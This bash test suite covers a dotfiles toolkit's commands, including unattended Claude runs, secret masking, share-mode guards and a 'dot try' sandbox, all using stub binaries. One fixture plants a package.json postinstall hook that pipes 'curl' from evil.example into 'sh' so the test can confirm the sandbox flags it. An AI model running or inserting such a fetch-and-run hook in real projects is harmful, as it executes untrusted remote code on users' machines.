#!/usr/bin/env bash
# Tests for dot night / recall / habits / mode / new, with throwaway repos and
# stand-ins for `claude` and `gh` (nothing leaves the machine).
# shellcheck disable=SC2034,SC2088  # vars are read by the eval in check(); ~ is meant literally
set -uo pipefail
DOT="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"
S="$DOT/config/scripts"
T="$(cd "$(mktemp -d)" && pwd -P)"   # physical path (macOS: /var → /private/var)
FB="$T/fakebin"
mkdir -p "$FB" "$T/Github"
cd "$T" || exit 1   # never run the stand-ins inside the dotfiles repo
export HOME="$T" XDG_CONFIG_HOME="$T/.config" XDG_DATA_HOME="$T/.local/share" XDG_CACHE_HOME="$T/.cache" XDG_STATE_HOME="$T/.local/state"
export GIT_CONFIG_GLOBAL="$T/gitconfig" FAKE_LOG="$T/claude.log" ANTHROPIC_API_KEY=sk-ant-must-not-leak
export PATH="$FB:$PATH" DOT_PROJECTS="$T/Github"
export DOT_EVOLVE=0   # dot night run would queue the weekly evolve task; tested on its own below
unset TERM_PROGRAM
fails=0
pass() { printf '  ✓ %s\n' "$*"; }
fail() { printf '  ✗ %s\n' "$*"; fails=$((fails + 1)); }
check() { if eval "$2"; then pass "$1"; else fail "$1"; fi; }
py() { python3 "$S/$1" "${@:2}"; }

git config --global user.email me@example.com
git config --global user.name "Test Person"
git config --global init.defaultBranch main

# a repo with an origin
git init -q --bare "$T/origin.git"
git clone -q "$T/origin.git" "$T/Github/app" 2>/dev/null
echo hi > "$T/Github/app/README.md"
echo "SECRET=1" > "$T/Github/app/.env"
echo ".env" > "$T/Github/app/.gitignore"
git -C "$T/Github/app" add README.md .gitignore
git -C "$T/Github/app" commit -qm "chore: init"
git -C "$T/Github/app" push -q origin main
git -C "$T/Github/app" remote set-head origin main

# claude: edits, commits (with the attribution it isn't supposed to add), reports
cat > "$FB/claude" <<'EOF'
#!/usr/bin/env bash
if [ "$1" = auth ]; then printf '{"authMethod":"%s"}\n' "${FAKE_AUTH:-claude.ai}"; exit 0; fi
{ echo "ARGS: $*"; echo "KEY=${ANTHROPIC_API_KEY:-unset}"; echo "PWD=$PWD"; cat; } > "$FAKE_LOG"
case "${FAKE_MODE:-}" in
    limit) printf '{"is_error":true,"result":"Claude usage limit reached. Your limit will reset at 5am."}\n'; exit 1 ;;
    plain) echo "The API said it listens on port 4000."; exit 0 ;;
esac
# only the night shift gets the "edit and commit" act, and only in its worktree
if [ "${DOT_NIGHT:-}" != 1 ] || [[ "$PWD" != */.night/* ]]; then echo '["dclog","kklogs"]'; exit 0; fi
echo fixed >> README.md
git add README.md
git commit -qm "docs: fix readme" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_x"
printf '{"is_error":false,"num_turns":7,"result":"STATUS: READY\\nFixed the README.\\nRan the tests."}\n'
EOF
cat > "$FB/gh" <<'EOF'
#!/usr/bin/env bash
echo "gh $*" >> "$FAKE_LOG.gh"
case "$1 $2" in "pr create") echo "https://github.com/me/app/pull/7" ;; esac
EOF
chmod +x "$FB/claude" "$FB/gh"

echo "dot night"
out=$(cd "$T" && py dot-night "app: fix the readme typo")
id=$(printf '%s' "$out" | sed -n 's/.*queued \([0-9a-z]*\) for.*/\1/p')   # not a tty: no colours
check "queued with an id" '[ -n "$id" ]'
check "listed" 'py dot-night list | grep -q "fix the readme typo"'
out=$(cd "$T/Github/app" && py dot-night "add a changelog")
check "queues for the repo you are in" '[[ "$out" == *"for"*"app"* ]]'
id2=$(printf '%s' "$out" | sed -n 's/.*queued \([0-9a-z]*\) for.*/\1/p')
py dot-night cancel "$id2" >/dev/null
py dot-night run >/dev/null 2>&1
check "API key never reaches claude" 'grep -q "^KEY=unset" "$FAKE_LOG"'
check "runs unattended (dontAsk), push denied" 'grep -q -- "--permission-mode dontAsk" "$FAKE_LOG" && grep -q "Bash(git push\*)" "$FAKE_LOG"'
check "asks for no attribution" 'grep -q "\"commit\": \"\"" "$FAKE_LOG"'
check "runs in a worktree, not your checkout" 'grep -q "^PWD=$T/Github/.night/app-$id" "$FAKE_LOG"'
wt="$T/Github/.night/app-$id"
check "your checkout untouched" '[ -z "$(git -C "$T/Github/app" status --porcelain)" ] && [ "$(git -C "$T/Github/app" rev-parse --abbrev-ref HEAD)" = main ]'
check ".env copied into the worktree" '[ -f "$wt/.env" ]'
check "on a night/ branch" 'git -C "$wt" rev-parse --abbrev-ref HEAD | grep -q "^night/"'
check "AI attribution stripped from commits" '! git -C "$wt" log -1 --format=%B | grep -qiE "co-authored-by|claude-session"'
check "commit message kept" 'git -C "$wt" log -1 --format=%s | grep -q "docs: fix readme"'
check "state ready" 'grep -q "\"state\": \"ready\"" "$XDG_DATA_HOME/dotfiles/night/queue.json"'
check "cancelled task didn't run" 'grep -q "\"state\": \"cancelled\"" "$XDG_DATA_HOME/dotfiles/night/queue.json"'
check "first-prompt line written" 'grep -q "1 ready" "$XDG_DATA_HOME/dotfiles/night/unseen"'
out=$(py dot-night report)
check "report shows the summary and next step" '[[ "$out" == *"Fixed the README"* && "$out" == *"dot night pr $id"* ]]'
check "report seen once" '! py dot-night report | grep -q "Fixed the README"'
py dot-night pr "$id" >/dev/null 2>&1
check "pr pushes the branch" 'git -C "$T/Github/app" ls-remote --heads origin | grep -q night/'
check "draft PR without STATUS line" 'grep -q "pr create --draft" "$FAKE_LOG.gh" && ! grep -q "STATUS:" "$FAKE_LOG.gh"'
check "state pr" 'py dot-night list | grep -q "pull/7"'
py dot-night clean >/dev/null
check "clean removes the worktree" '[ ! -d "$wt" ]'
py dot-night "app: second" >/dev/null
FAKE_MODE=limit py dot-night run >/dev/null 2>&1
check "usage limit → stays queued" 'py dot-night list | grep "second" | grep -q "⏳"'
rm -f "$XDG_CACHE_HOME/dotfiles/claude-auth"   # dot-ai caches a good login for 6 h
: > "$FAKE_LOG"
FAKE_AUTH=apiKey py dot-night run >/dev/null 2>&1
rc=$?
check "won't start without the subscription login" '[ "$rc" -ne 0 ] && ! grep -q "^ARGS: -p" "$FAKE_LOG" && py dot-night list | grep "second" | grep -q "⏳"'
rm -f "$XDG_CACHE_HOME/dotfiles/claude-auth"

echo "dot recall"
R="$XDG_DATA_HOME/dotfiles/recall"
mkdir -p "$R"
printf '%s\n' "{\"t\":\"$(date -u +%FT%TZ)\",\"cwd\":\"$T/Github/app\",\"cmd\":\"pnpm dev\",\"status\":0,\"out\":\"vite\\n  Local:   http://localhost:5173/\"}" > "$R/$(date +%F).jsonl"
printf '%s\n' '{"t":"2020-01-01T00:00:00Z","cwd":"/","cmd":"old","status":0,"out":"old"}' > "$R/2020-01-01.jsonl"
out=$(py dot-recall 5173)
check "finds output text" '[[ "$out" == *"pnpm dev"* && "$out" == *"localhost:5173"* ]]'
check "prunes old days" '[ ! -f "$R/2020-01-01.jsonl" ]'
check "--cmd matches commands only" 'py dot-recall --cmd 5173 >/dev/null; [ $? -eq 1 ]'
check "--here limits to the repo" '(cd "$T/Github/app" && py dot-recall --here 5173 >/dev/null) && ! (mkdir -p "$T/elsewhere" && cd "$T/elsewhere" && py dot-recall --here 5173 >/dev/null 2>&1)'
FAKE_MODE=plain py dot-recall --ai "what port is vite on?" >/dev/null
check "--ai goes through dot-ai (no API key)" 'grep -q "^KEY=unset" "$FAKE_LOG" && grep -q "localhost:5173" "$FAKE_LOG"'
check "--forget" 'py dot-recall --forget >/dev/null && [ ! -d "$R" ]'
if command -v lua5.4 >/dev/null || command -v lua >/dev/null; then
    LUA=$(command -v lua5.4 || command -v lua)
    masked=$(cd "$DOT/config/wezterm" && "$LUA" - <<'EOF'
local function any() return setmetatable({}, {__index=function() return any end, __call=function() return any() end, __concat=function() return "" end}) end
package.loaded.wezterm = setmetatable({home_dir="/tmp/x", GLOBAL={}, target_triple="x86_64-unknown-linux-gnu"}, {__index=function() return any() end})
package.path = "./?.lua;" .. package.path
print(require("features").mask_secrets("GH_TOKEN=ghp_abc123 key sk-ant-xyz https://u:pw@h password: hunter2 keep"))
EOF
)
    check "secrets masked before saving" '[[ "$masked" != *ghp_abc123* && "$masked" != *sk-ant-xyz* && "$masked" != *hunter2* && "$masked" != *":pw@"* && "$masked" == *keep* ]]'
fi

echo "dot habits"
mkdir -p "$T/repo/config/shell" "$T/repo/config/navi/cheats" "$XDG_CONFIG_HOME"
ln -sfn "$T/repo/config/shell" "$XDG_CONFIG_HOME/shell"
ln -sfn "$T/repo/config/navi" "$XDG_CONFIG_HOME/navi"
echo "alias gs='git status --short --branch --ahead-behind'" > "$T/repo/config/shell/aliases.sh"
H="$T/history.tsv"
now=$(date '+%Y-%m-%d %H:%M:%S')
: > "$H"
for _ in 1 2 3 4 5 6 7; do printf '%s\t0\t%s\n' "$now" "docker compose logs -f api | grep ERROR" >> "$H"; done
for _ in 1 2 3 4 5 6 7; do printf '%s\t0\t%s\n' "$now" "git status --short --branch --ahead-behind" >> "$H"; done
for _ in 1 2 3 4 5 6 7; do printf '%s\t0\t%s\n' "$now" "export GH_TOKEN=ghp_0123456789abcdef0123" >> "$H"; done
for _ in 1 2 3 4 5 6 7; do printf '%s\t1\t%s\n' "$now" "pnpm run something-that-always-fails" >> "$H"; done
for a in web api db cache mail jobs pay sync search auth; do printf '%s\t0\t%s\n' "$now" "kubectl --kubeconfig ~/.kube/k3s-arc.yaml logs -n arc $a" >> "$H"; done
export DOT_HABITS_FROM="$H"
check "counts suggestions" '[ "$(py dot-habits --check)" = 2 ]'
in_tty() { # run a command with a terminal (dot habits asks on /dev/tty)
    if [ "$(uname -s)" = Darwin ]; then script -q /dev/null "$@"; else script -qfc "$*" /dev/null; fi
}
in_tty python3 "$S/dot-habits" < <(sleep 1; printf 'y\n'; sleep 0.5; printf 'y\n') > "$T/habits.out" 2>&1 || true
check "aliases written to the repo" 'grep -q "^alias .*docker compose logs -f api | grep ERROR" "$T/repo/config/shell/habits.sh" && grep -q "kubectl --kubeconfig" "$T/repo/config/shell/habits.sh"'
check "skips secrets, failures, existing aliases" '! grep -qE "GH_TOKEN|always-fails|git status" "$T/repo/config/shell/habits.sh"'
check "habits.sh is valid shell" 'bash -n "$T/repo/config/shell/habits.sh"'
check "accepted ones aren't suggested again" '[ "$(py dot-habits --check)" = 0 ]'
unset DOT_HABITS_FROM

echo "dot mode"
mkdir -p "$T/Github/acme-web" && git -C "$T/Github/acme-web" init -q
py dot-work clients --add acme "~/Github/acme-web" --name "Acme Corp" >/dev/null
out=$(TERM_PROGRAM=WezTerm bash "$S/dot-mode" share acme)
var=$(printf '%s' "$out" | grep -ao 'dot_mode=[A-Za-z0-9+/=]*' | head -1 | cut -d= -f2-)
json=$(printf '%s' "$var" | base64 -d)
check "tells WezTerm: share, label, folders" '[[ "$json" == *"\"mode\":\"share\""* && "$json" == *"Acme Corp"* && "$json" == *"acme-web"* ]]'
check "state file while sharing" 'grep -q "mode=share" "$XDG_STATE_HOME/dotfiles/mode"'
check "status" 'bash "$S/dot-mode" status | grep -q "sharing: Acme Corp"'
ZDOTDIR="$T" zsh -c ". '$DOT/config/shell/share.sh'; _dot_share_risky 'cat .env.local'" && pass "guard: cat .env is risky" || fail "guard: cat .env is risky"
ZDOTDIR="$T" zsh -c ". '$DOT/config/shell/share.sh'; ! _dot_share_risky 'cat README.md' && ! _dot_share_risky 'environment-check'" && pass "guard: ordinary commands pass" || fail "guard: ordinary commands pass"
bash "$S/dot-mode" work >/dev/null
check "work ends it" '[ ! -f "$XDG_STATE_HOME/dotfiles/mode" ] && bash "$S/dot-mode" status | grep -q normal'
ZDOTDIR="$T" zsh -c ". '$DOT/config/shell/share.sh'; ! _dot_share_risky 'cat .env'" && pass "guard off when not sharing" || fail "guard off when not sharing"

echo "dot new"
out=$(bash "$S/dot-new" portal --local --dry-run --client acme --title "Acme Portal" 2>&1)
check "dry run plans the kaine-forge steps" '[[ "$out" == *"template:adopt --config template-adoption.json --write"* && "$out" == *"ai:install -- --non-interactive"* && "$out" == *"ai:doctor"* ]]'
check "adoption config" '[[ "$out" == *"\"productName\": \"Acme Portal\""* && "$out" == *"software.byteforge.portal"* && "$out" == *"\"repoSlug\": \"portal\""* ]]'
check "commit without AI attribution" '[[ "$out" == *"chore: adopt Kaine Forge template as Acme Portal"* && "$out" != *"Co-Authored"* ]]'
check "files it under the client" '[[ "$out" == *"clients --add acme ~/Github/portal"* ]]'
check "bad names refused" '! bash "$S/dot-new" "Bad Name" --local --dry-run >/dev/null 2>&1'
check "bad --id refused" '! bash "$S/dot-new" ok --local --dry-run --id "not valid" >/dev/null 2>&1'

old() { # days path… — set modification times N days back (portable)
    python3 -c 'import os,sys,time; t=time.time()-int(sys.argv[1])*86400; [os.utime(p,(t,t)) for p in sys.argv[2:]]' "$@"
}
ago_git() { echo "$(( $(date +%s) - $1 * 86400 )) +0000"; }

echo "dot janitor"
J="$T/jan"
mkproj() { # name days
    local r="$J/Github/$1" d
    d="$(ago_git "$2")"
    mkdir -p "$r/node_modules/pkg" "$r/dist" "$r/apps/web/.turbo" "$r/build"
    git -C "$r" init -q
    printf 'node_modules/\ndist/\n.turbo/\n' > "$r/.gitignore"
    echo "x" > "$r/index.js"
    echo "keep me" > "$r/build/tracked.txt"
    dd if=/dev/zero of="$r/node_modules/pkg/blob" bs=1048576 count=25 2>/dev/null
    echo c > "$r/apps/web/.turbo/cache"
    git -C "$r" add -A
    GIT_AUTHOR_DATE="$d" GIT_COMMITTER_DATE="$d" git -C "$r" commit -qm init
    old "$2" "$r/.git/index" "$r/.git/HEAD" "$r/index.js" "$r/.gitignore"
}
mkproj stale 90
mkproj fresh 1
out=$(HOME="$J" DOT_PROJECTS="$J/Github" XDG_CONFIG_HOME="$J/.config" python3 "$S/dot-janitor" --list 2>&1)
check "finds the stale project" '[[ "$out" == *"Github/stale"* && "$out" == *node_modules* ]]'
check "leaves recent projects alone" '[[ "$out" != *"Github/fresh"* ]]'
HOME="$J" DOT_PROJECTS="$J/Github" XDG_CONFIG_HOME="$J/.config" python3 "$S/dot-janitor" --yes >/dev/null 2>&1
check "deletes ignored build folders" '[ ! -d "$J/Github/stale/node_modules" ] && [ ! -d "$J/Github/stale/dist" ] && [ ! -d "$J/Github/stale/apps/web/.turbo" ]'
check "keeps code and tracked folders named build/" '[ -f "$J/Github/stale/index.js" ] && [ -f "$J/Github/stale/build/tracked.txt" ]'
check "recent project untouched" '[ -d "$J/Github/fresh/node_modules" ]'

echo "dot evolve"
E="$T/evo.tsv"
now=$(date '+%Y-%m-%d %H:%M:%S')
: > "$E"
for _ in 1 2 3 4; do printf '%s\t1\t3s\t%s\tpnpm test --filter api\n' "$now" "$T/Github/app" >> "$E"; done
for _ in 1 2; do printf '%s\t127\t1ms\t%s\thttpie GET x\n' "$now" "$T" >> "$E"; done
for _ in 1 2 3; do printf '%s\t0\t1s\t%s\ttldr tar\n' "$now" "$T" >> "$E"; done
for d in 1 2 3; do
    day=$(python3 -c "import datetime,sys; print((datetime.datetime.now()-datetime.timedelta(days=int(sys.argv[1]))).strftime('%Y-%m-%d'))" "$d")
    printf '%s 09:01:00\t0\t1s\t%s\tdocker compose up -d db\n%s 09:02:00\t0\t5s\t%s\tpnpm db:migrate\n%s 09:03:00\t0\t1s\t%s\tgit pull --rebase\n' \
        "$day" "$T/Github/app" "$day" "$T/Github/app" "$day" "$T/Github/app" >> "$E"
done
printf '%s\t1\t1s\t%s\tcurl -H "Authorization: Bearer abc123secret" https://x\n' "$now" "$T" >> "$E"
printf '%s\t1\t1s\t%s\tcurl -H "Authorization: Bearer abc123secret" https://x\n' "$now" "$T" >> "$E"
printf '%s\t1\t1s\t%s\tcurl -H "Authorization: Bearer abc123secret" https://x\n' "$now" "$T" >> "$E"
export DOT_EVOLVE_FROM="$E" DOT_EVOLVE_NO_DOCTOR=1
unset DOT_EVOLVE
rm -f "$XDG_STATE_HOME/dotfiles/evolve-last"
out=$(python3 "$S/dot-evolve")
check "repeated failures" '[[ "$out" == *"pnpm test --filter api"*"4×"* ]]'
check "command not found" '[[ "$out" == *"httpie"* ]]'
check "repeated lookups" '[[ "$out" == *"tldr: tar"* ]]'
check "morning ritual" '[[ "$out" == *"docker compose up"*"pnpm db:migrate"*"git pull"* ]]'
check "secrets masked" '[[ "$out" != *abc123secret* ]]'
# the dotfiles repo it improves (a throwaway one with an origin)
git init -q --bare "$T/dots-origin.git"
git clone -q "$T/dots-origin.git" "$T/Github/dotfiles" 2>/dev/null
echo "# dots" > "$T/Github/dotfiles/README.md"
git -C "$T/Github/dotfiles" add README.md && git -C "$T/Github/dotfiles" commit -qm "chore: init"
git -C "$T/Github/dotfiles" push -q origin main
export DOTFILES_DIR="$T/Github/dotfiles"
python3 "$S/dot-evolve" --auto >/dev/null
check "--auto queues a night task with the report" 'grep -q "\"kind\": \"evolve\"" "$XDG_DATA_HOME/dotfiles/night/queue.json" && grep -q "pnpm test --filter api" "$XDG_DATA_HOME/dotfiles/night/queue.json"'
python3 "$S/dot-evolve" --auto >/dev/null
check "only once a week" '[ "$(grep -c "\"kind\": \"evolve\"" "$XDG_DATA_HOME/dotfiles/night/queue.json")" = 1 ]'
: > "$FAKE_LOG.gh"
rm -f "$XDG_CACHE_HOME/dotfiles/claude-auth"
py dot-night run >/dev/null 2>&1
check "night shift opens the draft PR by itself" 'grep -q "pr create --draft" "$FAKE_LOG.gh" && py dot-night list | grep "evolve" | grep -q "pull/7"'
check "the report never lands in the PR" '! grep -q "abc123secret\|pnpm test --filter" "$FAKE_LOG.gh"'
unset DOT_EVOLVE_FROM DOT_EVOLVE_NO_DOCTOR DOTFILES_DIR
export DOT_EVOLVE=0

echo "dot upgrade"
U="$T/upg"
git init -q --bare "$U/origin.git"
git clone -q "$U/origin.git" "$U/dots" 2>/dev/null
printf '#!/usr/bin/env bash\necho "install $*" >> "%s"\n' "$U/install.log" > "$U/dots/install.sh"
chmod +x "$U/dots/install.sh"
echo "alias a=1" > "$U/dots/habits.sh"
git -C "$U/dots" add -A && git -C "$U/dots" commit -qm "chore: init" && git -C "$U/dots" push -q origin main
git clone -q "$U/origin.git" "$U/other" 2>/dev/null
echo "new" > "$U/other/NEW" && git -C "$U/other" add NEW && git -C "$U/other" commit -qm "feat: new" && git -C "$U/other" push -q origin main
echo "alias b=2" >> "$U/dots/habits.sh"   # a local edit, like dot habits makes
out=$(DOTFILES_DIR="$U/dots" bash "$S/dot" upgrade 2>&1); rc=$?
check "local edits don't block the pull" '[ "$rc" = 0 ] && [ -f "$U/dots/NEW" ] && grep -q "alias b=2" "$U/dots/habits.sh"'
check "tools upgraded" 'grep -q "install --upgrade" "$U/install.log"'
git -C "$U/dots" commit -qam "chore: local"
echo "more" > "$U/other/MORE" && git -C "$U/other" add MORE && git -C "$U/other" commit -qm "feat: more" && git -C "$U/other" push -q origin main
: > "$U/install.log"
out=$(DOTFILES_DIR="$U/dots" bash "$S/dot" upgrade 2>&1); rc=$?
check "diverged: says how to fix, still upgrades the tools" '[ "$rc" = 1 ] && [[ "$out" == *"NOT pulled"*"pull --rebase"* ]] && grep -q "install --upgrade" "$U/install.log"'
git -C "$U/dots" switch -q -c scratch
out=$(DOTFILES_DIR="$U/dots" bash "$S/dot" upgrade 2>&1); rc=$?
check "branch without upstream: says so" '[ "$rc" = 1 ] && [[ "$out" == *"no upstream"* ]]'

echo "z typos"
if command -v zoxide >/dev/null 2>&1 && command -v fzf >/dev/null 2>&1; then
    mkdir -p "$T/Github/web-shop/apps" "$T/Github/billing"
    for sh in bash zsh; do
        command -v "$sh" >/dev/null 2>&1 || continue
        out=$(cd / && _ZO_DATA_DIR="$T/zo-$sh" "$sh" -c '. "$1"; zoxide add "$2" "$2/apps" "$3"; z web-shp 2>&1; pwd; z nothing-like-it 2>&1; echo "rc=$?"' _ \
            "$DOT/config/shell/aliases.sh" "$T/Github/web-shop" "$T/Github/billing" 2>&1)
        nl=$'\n'
        check "$sh: a typo jumps to the closest folder" '[[ "$out" == *"going to $T/Github/web-shop"* && "$out" == *"${nl}$T/Github/web-shop${nl}"* ]]'
        check "$sh: no match is still an error" '[[ "$out" == *"rc=1"* ]]'
    done
else
    echo "  - zoxide or fzf not installed: skipped"
fi

echo "dot try"
cat > "$FB/docker" <<'EOF'
#!/usr/bin/env bash
echo "docker $*" >> "$FAKE_LOG.docker"
db="$FAKE_LOG.db"; touch "$db"
case "$1" in
  info|start) exit 0 ;;
  run) name=""; exp=""; prev=""
       for a in "$@"; do
         [ "$prev" = --name ] && name="$a"
         case "$prev:$a" in --label:dot.try.expires=*) exp="${a#*=}" ;; esac
         prev="$a"
       done
       echo "$name|$exp" >> "$db"; echo id ;;
  exec) echo "EXEC $*" >> "$FAKE_LOG.docker"; echo "installed" ;;
  ps) while IFS='|' read -r n e; do
        case "$*" in *Status*) printf '%s\trepo\t%s\tUp\n' "$n" "$e" ;; *expires*) echo "$n $e" ;; *CreatedAt*) printf 'x\t%s\n' "$n" ;; *) echo "$n" ;; esac
      done < "$db" ;;
  inspect) grep -q "^$2|" "$db" ;;
  rm) shift; [ "$1" = -f ] && shift; grep -v "^$1|" "$db" > "$db.t" || true; mv "$db.t" "$db" ;;
esac
EOF
chmod +x "$FB/docker"
R2="$T/sus"
mkdir -p "$R2" && git -C "$R2" init -q
echo '{"name":"sus","scripts":{"postinstall":"curl -s https://evil.example/x | sh"}}' > "$R2/package.json"
echo "# Sus" > "$R2/README.md"
echo "TOPSECRET" > "$T/secret.txt"
ln -s "$T/secret.txt" "$R2/notes.md"
git -C "$R2" add -A && git -C "$R2" commit -qm init
: > "$FAKE_LOG"
out=$(DOT_TRY_NO_TAB=1 bash "$S/dot-try" "$R2" 2>&1)
check "sandbox ready" '[[ "$out" == *"Sandbox ready"* ]]'
check "locked-down container" 'grep "docker run" "$FAKE_LOG.docker" | grep -q -- "--cap-drop ALL" && grep "docker run" "$FAKE_LOG.docker" | grep -q "no-new-privileges" && grep "docker run" "$FAKE_LOG.docker" | grep -q -- "--user"'
check "only the repo is mounted" '[ "$(grep "docker run" "$FAKE_LOG.docker" | grep -o -- " -v " | wc -l | tr -d " ")" = 1 ] && ! grep "docker run" "$FAKE_LOG.docker" | grep -q "docker.sock"'
check "installs inside the container" 'grep -q "EXEC .*npm ci" "$FAKE_LOG.docker"'
check "tour flags the install hook" 'grep -q "postinstall" "$FAKE_LOG" && grep -q "evil.example" "$FAKE_LOG"'
check "symlinks don't leak files into the tour" '! grep -q TOPSECRET "$FAKE_LOG"'
check "tour goes through dot-ai (no API key)" 'grep -q "^KEY=unset" "$FAKE_LOG"'
check "listed with time left" 'bash "$S/dot-try" list | grep -q "h left"'
sed -i.bak 's/|[0-9][0-9]*$/|1000/' "$FAKE_LOG.db"
bash "$S/dot-try" clean
check "expired sandboxes are removed" '[ -z "$(cat "$FAKE_LOG.db")" ] && [ -z "$(ls -A "$XDG_CACHE_HOME/dotfiles/try" 2>/dev/null)" ]'

echo "dot invite"
if command -v tmux >/dev/null 2>&1; then
    printf '#!/usr/bin/env bash\necho "ttyd $*" >> "$FAKE_LOG.inv"\nexec sleep 300\n' > "$FB/ttyd"
    printf '#!/usr/bin/env bash\necho "cloudflared $*" >> "$FAKE_LOG.inv"\necho "INF |  https://quiet-otter.trycloudflare.com  |" >&2\nexec sleep 300\n' > "$FB/cloudflared"
    chmod +x "$FB/ttyd" "$FB/cloudflared"
    out=$(bash "$S/dot-invite" --for 30m 2>&1)
    url=$(printf '%s' "$out" | grep -Eo 'https://quiet-otter\.trycloudflare\.com/[A-Za-z0-9_-]+/' | head -n 1)
    check "public link with a secret path" '[ -n "$url" ] && [ ${#url} -gt 60 ]'
    check "viewers attach read-only" 'grep -q "attach-session -r" "$FAKE_LOG.inv"'
    check "ttyd only on this machine" 'grep -q -- "--interface 127.0.0.1" "$FAKE_LOG.inv" && grep -q -- "--base-path /" "$FAKE_LOG.inv"'
    check "share mode on" 'grep -q "mode=share" "$XDG_STATE_HOME/dotfiles/mode"'
    check "status" 'bash "$S/dot-invite" status | grep -q "min left"'
    ttyd_pid=$(sed -n 's/^ttyd=//p' "$XDG_STATE_HOME/dotfiles/invite/current")
    bash "$S/dot-invite" stop >/dev/null
    gone() { # pid — exited (or a zombie nobody reaped yet) within 3 s
        local i
        for i in $(seq 1 30); do
            kill -0 "$1" 2>/dev/null || return 0
            ps -o stat= -p "$1" 2>/dev/null | grep -q Z && return 0
            sleep 0.1
        done
        return 1
    }
    check "stop ends the link and share mode" 'gone "$ttyd_pid" && [ ! -f "$XDG_STATE_HOME/dotfiles/mode" ] && [ ! -f "$XDG_STATE_HOME/dotfiles/invite/current" ]'
    check "too long is refused" '! bash "$S/dot-invite" --for 9h >/dev/null 2>&1'
    tmux -L dot-invite kill-server 2>/dev/null || true
    rm -f "$FB/ttyd" "$FB/cloudflared"
else
    echo "  - tmux not installed: skipped"
fi

[ -n "${KEEP:-}" ] || rm -rf "$T"; echo "T=$T"
echo
if [ "$fails" -eq 0 ]; then echo "features: all good"; else echo "features: $fails failed"; exit 1; fi
